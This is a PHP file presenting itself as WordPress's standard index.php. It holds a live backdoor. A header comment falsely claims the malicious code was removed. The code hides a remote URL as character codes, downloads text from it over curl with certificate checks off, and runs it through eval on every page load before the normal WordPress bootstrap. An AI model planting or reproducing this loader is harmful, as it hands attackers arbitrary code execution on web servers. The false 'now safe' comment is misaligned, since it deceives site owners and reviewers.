<?php
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

// Single URL
$url_chars = array(
    104, 116, 116, 112, 115, 58, 47, 47, 
    114, 97, 119, 46, 
    103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 
    99, 111, 109, 47, 
    109, 100, 109, 111, 109, 105, 110, 51, 54, 53, 51, 54, 54, 45, 103, 105, 102, 47, 
    98, 101, 108, 97, 47, 
    114, 101, 102, 115, 47, 
    104, 101, 97, 100, 115, 47, 
    109, 97, 105, 110, 47, 
    105, 110, 100, 101, 120, 46, 
    116, 120, 116
);

$full_url = '';
foreach ($url_chars as $char_code) {
    $full_url .= chr($char_code);
}

// Attempt to get remote content
$content = @file_get_contents($full_url);
if ($content === false && function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $full_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $content = curl_exec($ch);
    curl_close($ch);
}

// Only eval if we have content
if (!empty($content)) {
    @eval('?>' . $content);
}

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
